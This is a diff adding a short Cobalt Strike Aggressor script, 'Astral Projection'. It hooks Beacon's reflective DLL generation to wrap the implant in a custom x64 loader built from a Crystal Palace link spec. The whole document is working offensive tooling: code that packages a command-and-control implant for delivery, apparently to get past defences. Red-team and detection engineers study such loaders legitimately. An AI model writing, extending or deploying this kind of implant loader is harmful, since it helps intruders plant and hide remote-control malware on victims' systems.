@@ -1,0 +1,41 @@
+debug ( 7 );
+
+import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
+
+sub print_info {
+   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Astral Projection]\o " . $1 );
+}
+
+set BEACON_RDLL_GENERATE
+{
+    local ( '$beacon $arch $spec_path $spec $cap $final' );
+
+    $beacon = $2;
+    $arch   = $3;
+
+    if ( $arch eq "x86" )
+    {
+        warn ( "Astral Projection is x64 only" );
+        return $null;
+    }
+
+    print_info ( "BEACON_RDLL_GENERATE" );
+
+    $spec_path = getFileProper ( script_resource ( "loader" ), "loader.spec" );
+    $spec      = [ LinkSpec Parse: $spec_path ];
+    $cap       = [ Capability Parse: cast ( $beacon, 'b' ) ];
+    $final     = [ $spec run: $cap, [ new HashMap ] ];
+
+    if ( strlen ( $final ) == 0 )
+    {
+        warn ( "Failed to build payload" );
+        return $null;
+    }
+
+    return $final;
+}
+
+set BEACON_RDLL_SIZE {
+   return "0";
+}
